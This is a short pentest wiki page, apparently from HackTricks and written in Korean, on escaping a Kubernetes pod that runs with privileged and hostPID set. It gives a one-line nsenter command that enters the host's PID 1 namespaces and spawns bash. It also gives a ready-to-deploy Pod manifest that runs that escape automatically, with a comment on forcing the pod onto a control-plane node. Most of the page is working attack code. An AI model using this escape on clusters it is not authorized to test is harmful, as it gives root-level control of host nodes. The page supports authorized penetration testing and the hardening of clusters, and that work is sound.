# Pod Escape Privileges

{{#include ../../../banners/hacktricks-training.md}}

## Privileged and hostPID

이러한 권한을 통해 **호스트 프로세스에 접근할 수** 있으며, **호스트 프로세스의 네임스페이스에 들어갈 수 있는 충분한 권한을 갖게 됩니다**.\
특권이 필요하지 않을 수도 있으며, 단지 몇 가지 기능과 다른 잠재적인 방어 우회(예: apparmor 및/또는 seccomp)만으로도 가능할 수 있습니다.

다음과 같은 명령을 실행하면 포드에서 탈출할 수 있습니다:
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
구성 예제:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: priv-and-hostpid-exec-pod
labels:
app: pentest
spec:
hostPID: true
containers:
- name: priv-and-hostpid-pod
image: ubuntu
tty: true
securityContext:
privileged: true
command:
[
"nsenter",
"--target",
"1",
"--mount",
"--uts",
"--ipc",
"--net",
"--pid",
"--",
"bash",
]
#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
```
{{#include ../../../banners/hacktricks-training.md}}
